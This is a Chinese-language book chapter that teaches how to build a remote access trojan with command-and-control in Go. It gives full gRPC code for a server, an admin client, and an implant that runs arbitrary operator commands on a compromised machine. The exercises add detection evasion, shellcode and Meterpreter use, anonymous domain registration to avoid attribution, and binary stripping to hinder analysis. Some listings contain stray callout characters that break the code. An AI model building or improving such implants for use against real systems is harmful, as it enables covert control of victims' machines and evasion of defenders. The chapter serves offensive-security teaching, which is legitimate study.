# 第14章：构建命令和控制的RAT

在本章，结合前几章的课程来构建一个基本的命令和控制 (C2) 的 `remote access Trojan (RAT)`。RAT病毒是攻击者用来在受害机器上远程执行操作的工具，例如访问文件系统、执行代码和嗅探网络流量。

构建这个 RAT 需要构建三个独立的工具：一个客户端植入、一个服务端和一个管理组件。客户端植入是RAT病毒在一个被破坏的工作站上运行的部分。服务器与植入的客户端交互，很像Cobalt Strike的团队服务器——广泛使用的C2工具的服务器组件——向受影响的系统发送命令。与使用单一服务来促进服务器和管理功能的团队服务端不同，我们将创建一个单独的、独立的管理组件，用于实际发出命令。该服务端充当中间人，编排被破坏系统和与管理组件交互的攻击者之间的通信。

设计 RAT 的方法有无数种。在本章中，我们重点介绍如何处理远程访问的客户端和服务端通信。出于这个原因，我们先展示如何构建简单粗暴的东西，然后让您去做显著的改进让您改进过的版本更健壮。在多数情况下，这些改进需要用到前面章节中的内容和代码示例。你将运用你的知识、创造力和解决问题的能力来提高你的执行能力。



## 开始

首先，让我们回顾一下将要做的事情：创建一个服务端，它以操作系统命令的形式从管理组件接收工作(也将创建管理组件)。 创建一个植入，定期轮询服务端获取新命令，然后将命令输出发布回服务端。 然后服务端将该结果返回给管理客户机，以便操作者(您)可以看到输出。 

首先安装工具，用于帮助我们处理这些网络交互，并检查这个项目的目录结构。

### 安装Protocol Buffers 用于定义 gRPC API

用 `gRPC` 构建所有的网络交互，`gRPC` 是有 Google 开发的一款高性能的远程过程调用 （RPC）框架。 RPC框架允许客户端通过标准和定义的协议与服务端通信，而无需知晓任何底层细节。 gRPC框架在HTTP/2上运行，以一种高效的二进制结构通信消息。

非常像其他的RPC机制，如 REST 或 SOAP，数据需要被定义，以便能够容易地序列化和反序列化。 幸运的是，有一种机制可以定义数据和API函数，因此可以与gRPC一起使用。 这个机制就是Protocol Buffers（也缩写为Protobuf），将API的标准语法和复杂的数据定义包含在 `.proto`文件中。 现有工具可将定义文件编译为Go支持的接口存根和数据类型。实际上，该工具可以生成各种语言的输出，也就是可以使用 `.proto` 文件生成 C# 存根和类型。

首先在系统中安装Protobuf编译器。 安装过程超出了本书的范围，但您可以在官方的 Go Protobuf库 https://github.com/golang/protobuf/ 上的“Installation”部分找到详细完整的安装信息。 同时，使用下面的命令安装gRPC包：

```sh
> go get -u google.golang.org/grpc
```

### 创建工程工作台

接下来，创建工程工作台。 创建四个子目录来存放三个组件（植入、服务端和管理组件）和定义 gRPC API 的文件。 每个组件的目录中，创建单个Go文件（与所在目录同名），该文件属于自己的 `main` 包。 这样可以作为独立的组件单独地编译和运行，且在组件上运行 `go build` 命令时会生成和目录同名的二进制。 同时，在 `grpcapi` 目录中创建名为 `implant.proto` 的文件。 该文件保存 Protobuf 架构和 gRPC API 定义。 目录结构应该像下面一样：

```sh
$ tree
.
|-- client
| |-- client.go
|-- grpcapi
| |-- implant.proto
|-- implant
| |-- implant.go
|-- server
| |-- server.go
```

创建了结构之后，我们就可以开始构建我们的实现了。在接下来的几个小节中，将带您浏览每个文件的内容。


## 定义并构建 gRPC API

下一个任务是定义gRPC API将使用的功能和数据。 与构建和使用 REST 端点不同，后者具有相当明确的一组期望（例如，它们使用 HTTP 动词和 URL 路径来定义对哪些数据采取哪些操作），gRPC 更随意。 可以有效地定义一个API服务，并将该服务的函数原型和数据类型与之绑定。 使用 Protobufs 定义API。 用Google搜索可以很快地找到Protobufs语法的完整说明，但是这里我们做个简短介绍。

至少，我们需要定义一个管理服务，操作者使用它向服务端发送操作系统命令(工作)。 同时也需要一个植入服务，用于从服务端获取工作，并将命令输出发送回服务端。 清单 14-1 是 `implant.proto` 文件的内容。 （所有的代码清单都在 github 仓库 https://github.com/blackhat-go/bhg/ 跟目录下。）

```proto
//implant.proto
syntax = "proto3";
package grpcapi;

// Implant defines our C2 API functions
service Implant {
	rpc FetchCommand (Empty) returns (Command);
	rpc SendOutput (Command) returns (Empty);
}

// Admin defines our Admin API functions
service Admin {
	rpc RunCommand (Command) returns (Command);
}

// Command defines a with both input and output fields
message Command {
	string In = 1;
	string Out = 2;
}

// Empty defines an empty message used in place of null
message Empty {
}
```

清单 14-1：用 Protobuf 定义 gRPC API (/ch-14/grpcapi/implant.proto)

还记得如何将这个定义的文件编译为Go特定的工件？ 好吧，明确地包含`package grpcapi` 来告诉编译器，我们希望在 `grpcapi` 包下创建这些工作。 包的名字是随意的。 这里使用是为了确保API代码与其他组件保持分离。

然后定义了一个名为 `Implant` 的服务和一个名为 `Admin` 的服务。 将其分开是因为 `Implant` 组件以不同于 `Admin` 客户端的方式与API交互。 举例来说，我们不希望 `Implant` 向我们的服务发送操作系统命令，就像我们不希望我们的 `Admin` 组件将命令输出发送到服务端一样。 

在 `Implant` 服务中定义了两个方法：`FetchCommand 和 Send Output`。 定义这些方法就像在Go中定义 `interface` 一样。 也可以说任何 `Implant` 服务的实现都需要实现这两个方法。 `FetchCommand` 使用 `Empty` 消息作为参数，且返回 `Command` 消息，将从服务端检索任何未完成的操作系统命令。 `SendOutput` 将 `Command` 消息（包含命令输出）发送回服务端。 刚刚提到的这些消息是任意的、复杂的数据结构，其中包含我们在端点之间来回传递数据所必需的字段。

`Admin` 服务定义了一个方法：`RunCommand` ，使用 `Command` 消息作为参数，并期望读回一个`Command` 消息。 其目的是让您，即 RAT 操作者，可以在具有运行植入程序的远程系统上运行操作系统命令。 

最后，定义了要传递的两个消息：`Command` 和 `Empty`。 `Command`有两个字段， 一个用于保存操作系统命令本身（名为 `In` 的字符串），另一用于保存命令输出（名为 `Out` 的字符串）。 注意，消息和字段的名字都是随意的，但是给每个字段都赋值了一个数字值。 您可能想知道，如果我们将`In` 和 `Out` 们定义为字符串，为何他们赋值数值。 答案是这只是模式定义，并非是实现。 这些数字表示消息中的字段在消息中的偏移。 也就是， `In` 先出现，`Out` 后出现。 `Empty` 中没有字段。 这是为了解决 Protobuf 不明确允许将空值传递到 RPC 方法或从 RPC 方法返回这一事实的技巧。 

现在有了模式。 需要编译该模式才算完成 gRPC的定义。 在 `grpcapi` 目录下执行下面的命令：

```sh
> protoc -I . implant.proto --go_out=plugins=grpc:./
```

在前面提到的初始化安装完成后这个命令才能用，该命令的作用是在当前目录下搜索名问 `implant.proto` 的 Protobuf 文件， 并在当前目录下生成特定于Go的输出。 一旦成功执行，在 `grpcapi` 目录下应该会生成名为 `implant.pb.go` 的新文件。 这个新文件包含了在Protobuf模式中创建的服务和消息的 `interface` 和 `struct` 定义。 我们将使用这些来构建我们的服务，植入和管理组件。 让我们一个一个来构建。

## 创建服务端

先从创建服务端开始，该服务端接收管理客户端的命令并从植入端轮询。 服务端是这几个组件中最复杂的，因为需要实现 `Implant` 和 `Admin` 服务。 另外， 还因为该服务端扮演管理组件和直入端之间的中间人，需要代理和管理进出双方的消息。 

### 实现 Protocol 接口

先来看下在 `server/server.go`（清单 14-2）中的服务端的内部结构。 在这里，实现了必要的接口方法，用于服务端从共享管道中读取和写入命令。 
```go
type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
	// No work
	return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}
```
清单 14-2：定义服务类型 (/ch-14/server/server.go)

为提供管理和植入的API，需要定义实现所有必要接口方法的服务类型。 这是启动 `Implant` 或 `Admin` 的唯一方式。 就是说，需要正确地定义 `Fetch Command(ctx context.Context, empty *grpcapi.Empty)`、 `SendOutput(ctx context.Context, result *grpcapi.Command)`、 和 `RunCommand(ctx context.Context, cmd *grpcapi.Command)` 方法 。 为了让植入端和管理API互斥，将它们以独立的类型来实现。 

首先创建名为 `implantServer` 和 `adminServer` 的结构体，他们都将实现必要的方法。 每个类型含有相同的字段：两个管道，用于收发工作和命令输出。 这是我们的服务器在管理和植入组件之间代理命令及其响应的一种非常简单的方法。

接下来定义了一对辅助函数，`NewImplantServer(work, output chan *grpcapi.Command) 和 NewAdminServer(work, output chan *grpcapi .Command)` ，用于创建 `implantServer` 和 `adminServer` 的新实例。 它们的存在只是为了确保管道能被正确地初始化。 

接下来是有趣的部分：gRPC方法的实现。 您可能注意到这些方法没有和 Protobuf 模式中的完全匹配。 例如，每个方法接收 `context.Context` 类型的参数且返回一个 `error`。 之前运行的 `protoc` 命令来编译 Protobuf 时，将这些添加到生成文件中的每个接口方法的定义中。 这让我们管理请求上下文和返回错误。 对于大多数网络通信这是非常标准的东西。 编译器使我们不必在我们的Protobuf文件中明确要求这样做。 

实现的第一个方法是 `implantServer, FetchCommand(ctx context.Context, empty *grpcapi.Empty)`，接收一个 `*grpcapi.Empty` 并返回一个 `*grpcapi.Command` 。 回想下定义 `Empty` 类型是因为gRPC不允许显示地使用空值。 我们不需接收任何输入，因为客户端植入会调用 `FetchCommand(ctx context.Context, empty *grpcapi.Empty)` 方法作为一种轮询机制，询问“嘿，您有工作给我吗？” 这个方法的逻辑有点复杂，因为仅当有真正的任务需要发送时才发送给值入端。 因此，在 `work` 管道上使用了 `select` 语句来确定是否有任务要做。 用这种方式从管道中读取是 `nonblocking`，意思是如果从管道中没有读取到数据就会执行 `default` 情况。 这是理想的，因为我们将让植入端定期调用 `FetchCommand(ctx context.Context, empty *grpcapi.Empty)` 作为一种近乎实时的工作方式。如果在通道中有任务，则返回该命令。在幕后，命令将被序列化并通过网络发送回植入端。

`implantServer` 的第二个方法是 `SendOutput(ctx context.Context, result *grpcapi.Command)` ，将接收到的 `*grpcapi.Command` 放入到 `output` 管道。 回想一下，我们定义的 `Command`  不仅有一个用于运行命令的字符串字段，还有一个用于保存命令输出的字段。 因为我们接收到的 `Command` 的输出字段填充了命令的结果（由植入端运行），因此，`SendOutput(ctx context.Context, result *grpcapi.Command)` 方法简单地从植入端取的结果，并将其放到管理组件稍后读取的管道中。

最后一个是 `implantServer` 中的 `RunCommand(ctx context.Context, cmd *grpcapi .Command)`方法，被定义为 `adminServer` 类型。 接收还未发送到植入端的 `Command`。 表示管理组件想要值入端执行的一个任务单元。 使用一个 goroutine 将任务放置到 `work` 管道中。 因为这里使用的是一个没有缓存的管道，会阻塞执行。 不过我们需要能够从输出管道读取到数据，因此，使用 goroutine 将任务放到管道中并继续执行。 阻塞执行，等待 `output` 管道响应。 本质上让流程同步执行：发送一个命令到植入端，然后等待响应。 当收到响应后，返回结果。 同样，希望 `Command` 的结果，输出字段由植入端执行操作系统命令的结果填充。 

### `main()` 函数

清单14-3是`server/server.go` 文件中的`main()` 函数，运行两个独立的服务——一个从管理端接收命令，另一个从值入端接收轮询。 使用两个监听者，以便能限制访问管理API——我们不希望任何人都与之交互——我们希望植入端监听一个可以从限制性网络访问的端口。 

```go
func main() {
	var (
		implantListener, adminListener net.Listener
		err error
		opts []grpc.ServerOption
		work, output chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err)
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
```
清单 14-3：运行管理和植入服务 (/ch-14/server/server.go)

首先声明变量。 使用两个监听者：一个用于植入服务，另一个用于管理服务。 这样做是为了可以在与植入API分开的端口上提供管理API。

创建用于在植入和管理服务间传递数据的管道。 需要注意的是，通过调用 `NewImplantServer (work, output) 和 NewAdminServer(work, output)` 使用相同的管道来初始化植入和管理服务。 通过使用一样的管道实例，可以让管理和植入服务再共享管道上回话。 

接下来，为每个服务初始化网络监听者，`implantListener` 绑定4444端口，`adminListener` 绑定9090端口。 一般使用80或443端口，这通常是HTTP/s 的网络出口，但在本例中，我们选择任意的端口仅用于测试，以及干扰开发机上运行的其他服务。 

我们已经定义了网络级监听器。 现在就设置gRPC服务和API。 通过调用 `grpc.NewServer()` 创建两个gRPC服务实例（一个用于管理API，一个用于植入API）。 这初始化核心gRPC服务器，它将为我们处理所有的网络通信等。 我们只需要告诉它使用我们的 API。 通过调用 `grpcapi.RegisterImplantServer(grpcImplantServer,implant)` 和 `grpcapi.RegisterAdminServer(grpcAdminServer, admin)` 来注册 API 实现的实例（在示例中名为 `implant` 和 `admin`）。 注意，尽管我们创建了名为 `grpcapi` 的包，但从未定义这两个函数；是 `protoc` 命令定义的。 这些函数在 `implant.pb.go` 中创建的，作为创建我们的植入和管理gRPC API 服务的新实例的一种手段。
很狡猾！

至此，我们已经定义了 API 的实现并将它们注册为 gRPC 服务。 要做的最后一件事是，调用 `grpcImplantServer.Serve(implantListener)` 来启动植入服务。 在 goroutine 中执行此操作以防止代码阻塞。 毕竟，我们也要通过调用 `grpcAdminServer.Serve (adminListener)` 启动管理服务。

现在服务端完成了，可以通过运行 `go run server/server.go` 来启动。 当然，还有东西和服务交互，因此也不会有任何响应。 让我们进入下一部分——植入端。


## 创建客户端植入

客户端植入被设计来运行在被破坏的系统上。 作为我们运行操作系统命令的后门。 这本例中，植入端定期轮询服务，请求工作。如果没有工作要做，什么也不会发生。否则，植入端执行操作系统命令并将输出返回给服务器。 

清单14-4是 `implant/implant.go` 的内容。 

```go
func main() {
	var
	(
		opts []grpc.DialOption
		conn *grpc.ClientConn
		err error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil { v
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn) 

	ctx := context.Background()
	for { 
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req) y
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			// No work
			time.Sleep(3*time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ") z
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput(){
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd) 
	}
}
```
清单 14-4：创建植入端 (/ch-14/implant/implant.go)

植入端代码只有一个 `main()` 函数。 从定义变量开始，包含一个 `grpcapi.ImplantClient` 类型。 `protoc` 命令自动地为我们创建这个类型。 该类型具有便利远程通信所需的所有RPC函数存根。 

然后通过 `grpc.Dial(target string, opts... DialOption)` 建立连接，植入服务运行在4444端口。 调用 `grpcapi.NewImplantClient(conn)` （protoc 创建的函数）时使用这个连接。 现在有了 `gRPC` 客户端，应该已经建立了与植入服务器的连接。

代码继续使用无限 `for loop` 轮询植入服务器，重复地查看是否有任务需要执行。 通过调用 `client.FetchCommand(ctx, req)` 来实现，将请求的上下文和 `Empt` 传递给该函数。 幕后是，该函数连接API服务。 如果收到的响应的 `cmd.In` 字段中没有任何东西，就暂停3秒后再重试。 当收到一个工作单元时，植入服务调用 `strings.Split(cmd.In, " ")` 命令分割为单个单词和参数。 这是必要的，因为Go执行操作系统命令的的语法是 `exec.Command(name, args...)`，`name` 是指要运行的命令，`args...` 是操作系统命令用到的子命令、标记和参数的列表。 Go这样做是为了防止操作系统命令注入，但是使执行变得复杂了，因为在执行前必须将命令分割成相关的部分。 通过运行`c.CombinedOutput()` 执行命令，并收集输出。 最后，我们获取该输出并向 `client.SendOutput(ctx, cmd)` 发起 gRPC 调用，将命令及其输出发送回服务器。 

植入程序完成了，可以通过 `go run implant/implant.go` 运行。 应该会链接到服务器。 同样，这也是虎头蛇尾，因为还没有任务要做。 只是几个正在运行的进程，建立连接但没有做任何有意义的事情。 让我们解决这个问题。


## 构建管理组件

管理组件是RAT最后的部分。 这是实际生成工作的地方。 工作将通过我们的管理 gRPC API 发送到服务端，然后服务端将其转发给植入程序。 服务端获取植入端的输出，并将其发送会管理客户端。 清单14-5是 `client/client.go` 的代码。

```go
func main() {
	var
	(
		opts []grpc.DialOption
		conn *grpc.ClientConn
		err error
		client grpcapi.AdminClient 
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil { 
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn) 
	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1] 
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd) 
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(cmd.Out) 
}
```
清单 14-5：创建管理客户端 (/ch-14/client/client.go)

通过定义 `grpcapi.AdminClient` 变量开始，和管理服务在9090端口建立连接，并在调用 `grpcapi.NewAdminClient(conn)` 时使用该连接创建管理gRPC客户端的实例。（记住 `grpcapi.AdminClient`类型和 `grpcapi .NewAdminClient()` 函数是由 `protoc` 创建的。）在继续之前，将这个客户端创建过程与植入代码进行比较。 注意相似之处，但也要注意类型、函数调用和端口的细微差别。

假设有一个命令行参数，我们从中读取操作系统命令。 当然，如果检查是否有参数被传入话，代码会更健壮些，但对于这个例子我们并不需要担心。 将命令赋值给 `cmd.In` 。 将 `*grpcapi.Command` 的实例 `cmd` 传送给 gRPC客户端的 `RunCommand(ctx context .Context, cmd *grpcapi.Command)` 方法。 幕后是，这个命令序列化并发送到之前创建的管理服务。 收到响应后，我们期望的输出填充操作系统命令结果。 将该输出写入控制台。


## 运行RAT

现在，假设服务端和植入端在运行中，可以通过 `go run client/client.go command` 来执行管理客户端。应该会在管理客户端的终端收到输出，并显示在屏幕上，如下所示：

```sh
$ go run client/client.go 'cat /etc/resolv.conf' 
domain Home
nameserver 192.168.0.1
nameserver 205.171.3.25
```

就是这样——工作中的 RAT。输出展示的是远程文件的内容。运行一些其他命令以查看植入端的运行情况。



## 优化RAT

正如在本章开头所提到的，我们特意保持 RAT 小巧且无过多的功能。不会更好的扩展。在处理错误或连接中断时不优雅，且缺乏许多基本功能，这些功能可以逃避检测、跨网络移动、升级权限等等。

我们没有在示例中做所有的这些改进，而是列出了一系列您可以自己进行的优化。我们讨论其中一些注意事项，但将其作为练习留给您。为了完成这些练习，您可能需要参考本书的其他章节，深入研究Go包文档，并尝试使用管道和并发。这是一个将您的知识和技能付诸实践的机会。去吧，让我们骄傲，年轻的学徒。

### 加密通信

所有C2实用程序都应该对其网络通信进行加密！对于植入端和服务端之间的通信尤其重要，因为在任何现代企业环境中，都应该能够发现出口网络监控。

使用TLS加密通信来修改植入端。这需要在客户端和服务端的 ` []grpc.DialOption` 切片设置额外的值。在此期间，您可能应该更改代码，以便将服务绑定到定义的接口，并默认侦听并连接到 localhost。这将防止未经授权的访问。

您必须考虑的一个问题是如何管理和管理植入端中的证书和密钥，特别是如果要执行基于证书的相互身份验证时。应该对它们硬编码吗？远程存储它们？在运行时使用一些魔术来确定植入端是否有权连接到服务器？

### 处理连接中断

当我们讨论通信主题时，如果植入端无法连接到服务器，或者服务器因植入程序运行而死机，会发生什么？可能已经注意到它中断了一切——植入端挂掉。如果植入端挂掉，那么就无法访问该系统。这可能是一个相当大的问题，特别是如果最初的损害以难以复现的方式发生。

解决这个问题。给植入端加一些弹性，这样当连接丢失时，它不会立即挂掉。这可能涉及到在 `implant.go` 文件中用调用`grpc.Dial(target string, opts ...DialOption)` 替换调用 `log.Fatal(err)`  的逻辑。

### 注册植入端

希望能追踪植入端。当前，管理客户端发送一个命令，期望只有一个植入程序存在。没有任何方法可以跟踪或注册植入端，更不用说向一个特定的植入端发送命令了。

添加使植入程序在初始连接时向服务器注册自己的功能，并为管理客户端添加功能以检索已注册的植入程序列表。也许为每个植入端分配一个唯一的整数或使用 UUID（查看 https://github.com/google/uuid/*）。这将需要对管理和植入 API 进行更改，从 `implant.proto` 文件开始。向 `Implant` 服务添加 `RegisterNewImplant` RPC 方法，向 ` Admin` 服务添加 `ListRegisteredImplants ` 方法。用 `protoc` 重新编译，在 `*server/ server.go` 文件中实现相应的接口方法，并在 `client/client.go`（对于管理端）和 `implant/implant.go`（对于植入端）的逻辑中添加新的功能.。

### 添加数据库持久化

如果完成了本节中前面的练习，就为植入端增加一些弹性，以承受连接中断并设置注册功能。 此时，您很可能在 `server/server.go` 的内存中维护已注册植入端的列表。 如果需要重新启动服务器，或者服务器死机了，该怎么办？ 植入端将继续重新连接，但当他们这样做时，服务器不知道哪些植入端已注册，因为已经失去植入端到他们的UUID的映射。 

更新服务器代码，将此数据存储在所选的数据库中。 对于一个非常快速和简单且最少依赖的解决方案，可以考虑使用SQLite数据库。有几个Go驱动可用。我们个人使用的是 `go-sqlite3 (https://github.com/mattn/go-sqlite3/)`。

### 支持多个植入端

实际上，您可能希望支持多个植入端同时来轮询服务器请求任务。 这也让RAT更有用，因为它可以管理多个植入端，但它也需要做相当大的更改。

这是因为，当您希望在某个植入端上执行命令时，您可能希望在单个特定的植入端上执行该命令，而不是第一个向服务器轮询工作的植入端上。 您可以依靠在注册期间创建的植入 ID 来保持植入互斥，并适当地引导命令和输出。 实现此功能，以便可以明确选择运行命令的目标植入端。

进一步地使逻辑复杂，需要考虑可能有多个管理操作人员同时发送命令，这在与团队一起工作时很常见。 这意味着可能将无缓冲的 `work` 和 `output` 管道转换为有缓冲的。 当有多个消息在传送时，这将有助于防止执行阻塞。 然而，要支持这种多路复用，需要实现一种机制，使请求者与其适当的响应相匹配。 例如，如果两个管理员同时向植入端发送任务，植入端会产生两个单独的响应。 如果操作员1发送 `ls` 命令，操作员2发送 `ifconfig` 命令，那么操作员1接收 `ifconfig` 命令的输出就不合适，反之亦然。

### 植入端添加功能

我们只实现了植入端接收并允许操作系统命令的功能。 然而，其他C2软件还包含许多其他便利的功能。 例如，如果能在植入端上上传或下载文件，那就太好了。 运行原始的shellcode可能会很好，例如，如果我们想在不接触磁盘的情况下生成一个Meterpreter shell。 扩展当前功能以支持这些附加特性。

### 链接操作系统命令

因为 Go 的 `os/exec` 包创建和运行命令的方式，目前无法将一个命令的输出作为输入通过管道传输到第二个命令。 例如，在我们当前的实现中不能工作：`ls -la | wc -l` 。 要解决这个问题，需要使用命令变量，它是在调用 `exec.Command()` 创建命令实例时创建的。 可以更改标准输入和输出属性以适当地重定向它们。 当与 `io.Pipe`  结合使用时，就可以强制一个命令（例如 `ls -la` ）的输出作为后续命令 ( `wc -l` ) 的输入。

### 强化植入端的认证和实践良好的 OPSEC

当在本节的第一个练习中向植入端添加加密通信时，是否使用了自签名证书？ 如果是的话，传输和后端服务器可能会引起设备和检查代理的怀疑。 相反，通过使用私人或匿名的联系方式与证书颁发机构服务一起注册域名，以创建合法的证书。 此外，如果有办法这样做，请考虑获取代码签名证书来签署植入端二进制。 

此外，考虑修改源代码路径的命名方案。 当构建二进制文件时，该文件会含有包路径。 带有描述性的路径名可能会将相关人员引向您。 此外，在构建二进制文件时，请考虑删除调试信息。
这有一个额外的好处，就是让二进制文件更小，更难反汇编。
用下面的命令可以实现：

```sh
$ go build -ldflags="-s -w" implant/implant.go
```

这些标志被传递给链接器以删除调试信息并剥离二进制文件。

### 添加 ASCII 艺术

你的实现可能是一团糟，但如果它有 ASCII 艺术，它是合法的。好吧，我们并不认真。
但是出于某种原因，每个安全工具似乎都有 ASCII 艺术，所以也许您应该将它添加到您的工具中。 
可以选择 Greetz。

## 总结

Go是一种非常适合编写跨平台植入程序的语言，就像在本章中构建的RAT一样。创建植入端可能是这个项目中最难的部分，因为与为操作系统API设计的语言(如c#和Windows API)相比，使用Go与底层操作系统交互具有挑战性。此外，因为Go构建的是静态编译的二进制文件，植入端文件可能会导致较大的二进制文件，这可能会对交付增加一些限制。

但对于后端服务来说，没有比这更好的了。这本书的一个作者(Tom)和另一个作者(Dan)一直在打赌，如果他从使用Go转向后端服务和通用工具，他将支付1万美元。 使用本书中描述的所有技术，您应该有一个扎实的基础来开始构建一些健壮的框架和实用程序。 

我们希望您喜欢阅读这本书，并像我们写这本书一样参与练习。我们鼓励您继续写 Go 代码，并用本书中学到的技能构建小的工具，以提升或取代您当前的任务。然后，随着经验的积累，开始开发更大的代码库并构建一些很棒的项目。要继续提高你的技能，看看一些受欢迎的大的 Go 项目，特别是一些大型组织的项目。 观看会议演讲（如 GopherCon），这些讲座可以引导了解更先进的话题，并讨论陷阱和增强编程的方法。 最重要的是，玩得开心——如果你做了一些巧妙的东西，告诉我们吧！以后见。